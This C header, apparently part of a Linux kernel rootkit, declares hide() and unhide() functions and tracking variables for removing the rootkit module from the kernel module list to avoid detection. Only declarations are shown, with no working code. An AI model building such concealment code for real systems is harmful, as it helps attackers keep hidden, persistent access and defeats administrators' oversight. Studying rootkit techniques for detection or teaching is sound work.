/**
 * @file hide.h
 * 
 * @brief Definitions for hiding the rootkit
 * 
 * This file contains the definitions for hiding the rootkit. The rootkit can be
 * hidden from the kernel module list to avoid detection.
 */

#ifndef _RK_HIDE_H
#define _RK_HIDE_H

// Variables to track the state of the rootkit hiding
static int hidden;

// Variable to store the previous module in the list
static struct list_head *prev_module;

/**
 * @brief Hide the rootkit from the kernel module list
 * 
 * This function hides the rootkit from the kernel module list to avoid detection.
 * 
 * @return 0 on success, -1 on failure
 */
int hide(void);

/**
 * @brief Unhide the rootkit from the kernel module list
 * 
 * This function unhides the rootkit from the kernel module list to allow the
 * rootkit to be removed.
 * 
 * @return 0 on success, -1 on failure
 */
int unhide(void);

#endif // _RK_HIDE_H